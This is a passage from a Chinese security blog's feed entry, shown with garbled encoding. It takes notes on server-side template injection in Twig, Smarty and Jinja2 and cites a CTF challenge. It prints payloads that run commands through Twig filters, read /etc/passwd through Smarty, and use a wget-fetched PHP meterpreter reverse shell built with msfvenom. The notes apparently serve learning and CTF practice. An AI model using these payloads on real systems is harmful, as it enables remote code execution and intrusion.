id="13-åŠ¨æ€æ³¨å…¥å‡½æ•°æ”»å‡»"><a href="#13-åŠ¨æ€æ³¨å…¥å‡½æ•°æ”»å‡»" class="headerlink" title="13.åŠ¨æ€æ³¨å…¥å‡½æ•°æ”»å‡»"></a>13.åŠ¨æ€æ³¨å…¥å‡½æ•°æ”»å‡»</h3><h3 id="14-URLæ”»å‡»"><a href="#14-URLæ”»å‡»" class="headerlink" title="14.URLæ”»å‡»"></a>14.URLæ”»å‡»</h3><h3 id="15-è¡¨å•æäº¤æ¬ºéª—æ”»å‡»"><a href="#15-è¡¨å•æäº¤æ¬ºéª—æ”»å‡»" class="headerlink" title="15.è¡¨å•æäº¤æ¬ºéª—æ”»å‡»"></a>15.è¡¨å•æäº¤æ¬ºéª—æ”»å‡»</h3><h3 id="16-HTTPè¯·æ±‚æ¬ºéª—æ”»å‡»"><a href="#16-HTTPè¯·æ±‚æ¬ºéª—æ”»å‡»" class="headerlink" title="16.HTTPè¯·æ±‚æ¬ºéª—æ”»å‡»"></a>16.HTTPè¯·æ±‚æ¬ºéª—æ”»å‡»</h3><h3 id="17-æ¨¡æ¿æ³¨å…¥"><a href="#17-æ¨¡æ¿æ³¨å…¥" class="headerlink" title="17.æ¨¡æ¿æ³¨å…¥"></a>17.æ¨¡æ¿æ³¨å…¥</h3><p>(ä»è¿™é‡Œæ‰¾åˆ°äº†å¤§ä½¬åšå®¢ï¼š<a href="https://www.cnblogs.com/bmjoker/">https://www.cnblogs.com/bmjoker/</a>)</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p><p>æ¨¡æ¿å¼•æ“ï¼šè¿™é‡Œç‰¹æŒ‡ç”¨äºWebå¼€å‘çš„æ¨¡æ¿å¼•æ“</p><p>â€‹        å®ƒå¯ä»¥ç”Ÿæˆç‰¹å®šæ ¼å¼çš„æ–‡æ¡£ï¼Œåˆ©ç”¨æ¨¡æ¿å¼•æ“æ¥ç”Ÿæˆå‰ç«¯çš„htmlä»£ç ï¼Œæ¨¡æ¿å¼•æ“ä¼šæä¾›ä¸€å¥—ç”Ÿæˆhtmlä»£ç çš„ç¨‹åºï¼Œç„¶ååªéœ€è¦è·å–ç”¨æˆ·çš„æ•°æ®ï¼Œç„¶åæ”¾åˆ°æ¸²æŸ“å‡½æ•°é‡Œï¼Œç„¶åç”Ÿæˆæ¨¡æ¿+ç”¨æˆ·æ•°æ®çš„å‰ç«¯htmlé¡µé¢ï¼Œç„¶ååé¦ˆç»™æµè§ˆå™¨ï¼Œå‘ˆç°åœ¨ç”¨æˆ·é¢å‰</p><p>sstiæ¨¡æ¿æ³¨å…¥</p><p>â€‹                            â€”â€“ä¹Ÿç§°æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥</p><p>å½“å‰æµè¡Œæ¡†æ¶ï¼Œæ¯”å¦‚pythonçš„flask</p><p>phpçš„tpï¼Œjavaçš„spring</p><h4 id="æ¼æ´æˆå› ï¼š"><a href="#æ¼æ´æˆå› ï¼š" class="headerlink" title="æ¼æ´æˆå› ï¼š"></a>æ¼æ´æˆå› ï¼š</h4><p>â€‹        æœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„æ¶æ„è¾“å…¥ä»¥åï¼Œæœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸º Web åº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œæ¨¡æ¿å¼•æ“åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ’å…¥çš„å¯ä»¥ç ´åæ¨¡æ¿çš„è¯­å¥ï¼Œå› è€Œå¯èƒ½å¯¼è‡´äº†æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShell ç­‰é—®é¢˜ã€‚å…¶å½±å“èŒƒå›´ä¸»è¦å–å†³äºæ¨¡ç‰ˆå¼•æ“çš„å¤æ‚æ€§ã€‚</p><p>åˆ©ç”¨å›¾è¡¨</p><p><img src="/2021/08/25/src/leak/1344396-20200911174631687-758048107.png" alt="img"></p><h4 id="Twigæ¨¡æ¿"><a href="#Twigæ¨¡æ¿" class="headerlink" title="Twigæ¨¡æ¿"></a>Twigæ¨¡æ¿</h4><p>ç”±å›¾å¯ä»¥çœ‹å‡ºï¼Œåœ¨ç»è¿‡æ¨¡æ¿è§£æåçš„å†…å®¹</p><p><img src="/2021/08/25/src/leak/1344396-20200818195801226-981945295.png" alt="img"></p><p>payloadï¼ˆ2.0ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200818231853350-914354726.png" alt="img"></p><p>æ–‡ç« è¿˜è¯¦ç»†ä»‹ç»äº†ä½¿ç”¨msfé€šè¿‡Twigæ¨¡æ¿æ³¨å…¥è·å–shell</p><p>ä½¿ç”¨msfç”Ÿæˆäº†ä¸€ä¸ªphp meterpreteræœ‰æ•ˆè½½è·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=<span class="number">192.168</span><span class="number">.127</span><span class="number">.131</span> LPORT=<span class="number">4321</span> &gt; /<span class="keyword">var</span>/www/html/shell.txt</span><br></pre></td></tr></table></figure><p> <img src="/2021/08/25/src/leak/1344396-20200818232520602-1757346385.png" alt="img"></p><p> æ¨¡æ¿æ³¨å…¥è¿œç¨‹ä¸‹è½½shellï¼Œå¹¶é‡å‘½åè¿è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;wget http://192.168.127.131/shell.txt </span></span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200818232914668-1182705687.png" alt="img"></p><h4 id="Smartyæ¨¡æ¿"><a href="#Smartyæ¨¡æ¿" class="headerlink" title="Smartyæ¨¡æ¿"></a>Smartyæ¨¡æ¿</h4><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure><p>CTFåœ°å€ï¼š<a href="https://buuoj.cn/challenges%EF%BC%88CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BAWeb11%EF%BC%89">https://buuoj.cn/challengesï¼ˆCISCN2019åä¸œå—èµ›åŒºWeb11ï¼‰</a></p><p>xffå¤´åšæ–‡ç« ï¼Œè¿›è¡Œæ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-Forï¼š&#123;sysytem(&#39;cat &#x2F;flag&#39;)&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜æˆ‘æ²¡æœ‰å•ç‹¬å†™æ–‡ç« ï¼Œå› ä¸ºè§£é¢˜è¿‡ç¨‹å¾ˆå¿«ï¼ŒçŸ¥è¯†ç‚¹å¯¹åº”ä¸Šäº†ã€‚</p><p>smarty-sstiå¸¸è§„åˆ©ç”¨æ–¹å¼</p><p><strong>1. {$smarty.version}</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.version&#125;  #è·å–smartyçš„ç‰ˆæœ¬å·</span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820233050238-1942906786.png" alt="img"></p><p><strong>2. {php}{/php}</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;php&#125;phpinfo();&#123;&#x2F;php&#125;  #æ‰§è¡Œç›¸åº”çš„phpä»£ç </span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820233259128-196602210.png" alt="img"></p><p><strong>3. {literal}</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt;   </span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820233719367-1535357026.png" alt="img"></p><p><strong>4.</strong> <strong>getstreamvariable</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820234305773-495371489.png" alt="img"></p><p><strong>5. {if}{/if}</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820234610811-341143885.png" alt="img"></p><p>pythonä¸­çš„ssti</p><p>å¸¸è§æ¨¡æ¿æœ‰ï¼šjinja2ï¼Œ tornado</p><h4 id="Jinjia2"><a href="#Jinjia2" class="headerlink" title="Jinjia2"></a>Jinjia2</h4><p>ä»¥Djangoçš„æ¨¡æ¿ä¸ºæ¨¡å‹çš„</p><p>å®ƒæ˜¯flaskæ¡†æ¶çš„ä¸€éƒ¨åˆ†ï¼ŒJinja2ä¼šæŠŠæ¨¡æ¿å‚æ•°æä¾›çš„ç›¸åº”çš„å€¼æ›¿æ¢äº†  å—ã€‚</p><p>Jinja2ä½¿ç”¨ ç»“æ„è¡¨ç¤ºä¸€ä¸ªå˜é‡ï¼Œå®ƒæ˜¯ä¸€ç§ç‰¹æ®Šçš„å ä½ç¬¦ï¼Œå‘Šè¯‰æ¨¡ç‰ˆå¼•æ“è¿™ä¸ªä½ç½®çš„å€¼ä»æ¸²æŸ“æ¨¡ç‰ˆæ—¶ä½¿ç”¨çš„æ•°æ®ä¸­è·å–ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PHPæ¼æ´ä»‹ç»&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.jb51.net/article/31898.htm&quot;&gt;https://www.jb51.net/article/31898.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;é’ˆå¯¹phpç½‘ç«™çš„ä¸»è¦å‡ ç§æ”»å‡»æ–¹å¼&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    
    <category term="src" scheme="http://daweitech.github.io/tags/src/"/>
    
  </entry>
  
</feed>
